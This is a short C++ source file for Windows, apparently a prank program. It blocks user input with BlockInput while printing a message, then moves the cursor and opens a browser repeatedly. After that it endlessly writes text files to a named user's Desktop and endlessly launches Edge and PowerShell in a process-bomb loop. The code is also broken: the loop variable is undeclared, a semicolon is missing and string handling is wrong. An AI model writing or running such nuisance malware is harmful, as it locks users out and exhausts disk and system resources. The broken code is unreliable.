#include <iostream.h>
#include <windows.h>
#include <winable.h>
#include <shellapi.h>
#include <fstream.h>
#include <direct.h>
#include <string.h>

int main()
{
	//blockInput prints on terminal "I love you 3000"
	
	BlockInput(true);
	
	sleep(10000);
	
	do 
	{
	   i++;	
	   
	   cout << "I love you 3000";	
	   
		
	} while(i < 9998)
	
    BlockInput(false);
	
	sleep(200);
	
   //Mouse arrow madness
   
   for (int i = 0; i < 10 ;i++)
   {
	   for (int j = 0; j < 10 ; j++)
	   {
		   SetCursorPos(i, j);
	   }
   }
	
	//Opening url 
	
	for (int i = 0; i < 20; i++)
	{	
	
	 ShellExecute(NULL,"open","https://www.google.com" , NULL, NULL, SW_SHOWNORMAL);
	 
	}
    //Making files and writing 
	
	
	std::string line = "Hello, I've taken you're permission to read and write";
	
	char *location = "C:\\Users\\Rafelia Fernandes\\Desktop\\"; //points to the memory location 
	
	__mkdir(location); //makes the file
	
	while (2 == 2)
		
	{  
      i++;
	  
	  std::fstream file ;
	  
	  file.open(location + std::to_string(i)+".txt", ios::out);
	  
	  file << line; //out of line is served as in to file thus written into file
	  
	  file.close();
	  
	}
	
	
	//Opening files like powershell and web browser
	
    for (int i = 0;;i++)
    { 
        if (i % 2 == 0)
		
		{
			system("msedge.exe");
			
		}
	 
	   else 
		   
	   {
		   
		   system("powershell.exe");
		   
	   }
	   
    }	
    

return 0;	

	
	
}